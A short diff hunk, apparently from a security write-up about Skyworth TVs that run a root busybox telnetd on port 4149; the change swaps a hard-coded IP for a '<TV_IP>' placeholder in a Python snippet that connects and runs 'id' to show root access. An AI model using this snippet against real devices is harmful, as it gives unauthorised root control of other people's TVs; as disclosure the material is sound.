@@ -93,7 +93,7 @@ Skyworth TVs run `busybox telnetd` on port `4149` as root:
 ```python
 import socket
 s = socket.socket()
-s.connect(("192.168.0.116", 4149))
+s.connect(("<TV_IP>", 4149))
 s.sendall(b"id\n") # Returns uid=0(root)
 ```
 
